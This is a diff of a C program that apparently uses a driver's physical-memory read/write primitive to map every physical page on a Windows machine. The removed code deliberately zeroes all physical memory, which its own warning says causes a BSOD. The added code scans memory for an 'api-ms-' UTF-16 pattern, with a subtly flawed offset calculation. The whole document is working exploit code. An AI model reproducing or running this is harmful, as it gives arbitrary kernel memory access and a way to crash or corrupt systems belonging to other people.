@@ -8,7 +8,14 @@
 #include "rw_primitive.h"
 #include "windows_helper_functions.h"
 
-
+void printBytes(void* ptr, int size)
+{
+	unsigned char* p = (unsigned char*)ptr;
+	for (int i = 0; i < size; i++) {
+		printf("%02hhX ", p[i]);
+	}
+	printf("\n");
+}
 
 int main(char argc, char** argv)
 {
@@ -65,20 +72,29 @@ int main(char argc, char** argv)
 	if (buf == 0) {
 		exit(EXIT_FAILURE);
 	}
-	
-	printf("THIS WILL DELETE EVERYTHING IN PHYSICAL MEMORY!!! CAUSING A BSOD!!!!\n");
-	system("pause");
-	for (int i = 3; i < memRegionsCount; i++) {
+
+	//random pattern
+	unsigned char patt[14] = {
+		0x61, 0x00, 0x70, 0x00, 0x69, 0x00, 0x2d, 0x00, 0x6d, 0x00, 0x73, 0x00, 0x2d, 00
+	};
+	for (int i = 5; i < memRegionsCount; i++) {
 		unsigned __int64 start = memRegion[i].address;
 		unsigned __int64 end = memRegion[i].address + memRegion[i].size;
 		printf("%p - %p\n", (void*)start, (void*)end);
 
 		for (__int64 page = start; page < end; page = page + 0x1000) {
-			if (MapPhysicalMemory((HANDLE) *(PDWORD64)hPhysicalMemory, page, 0x1000, buf) == FALSE) {
+			if (MapPhysicalMemory((HANDLE) * (PDWORD64)hPhysicalMemory, page, 0x1000, buf) == FALSE) {
 				fprintf(stderr, "[!] MapPhysicalMemory failed");
 				return EXIT_FAILURE;
 			}
-			memset(*buf, 0, 0x1000);
+			PVOID castedBuf = *buf;
+			for (unsigned int offset = 0; offset < (0xfff - sizeof(patt)); offset++) {
+				castedBuf = (unsigned char*)castedBuf + 1;
+				if (memcmp(castedBuf, patt, sizeof(patt)) == 0)
+				{
+					printf("\nFound pattern at: %p\n", (void*)(buf + offset));
+				}
+			}
 			if (UnmapPhysicalMemory(buf) == FALSE) {
 				printf("UnmapPhysicalMemory failed");
 				return EXIT_FAILURE;
@@ -90,5 +106,4 @@ int main(char argc, char** argv)
 	CloseHandle((HANDLE)*(PDWORD64)hPhysicalMemory);
 	CloseHandle(device);
 	return EXIT_SUCCESS;
-
 }
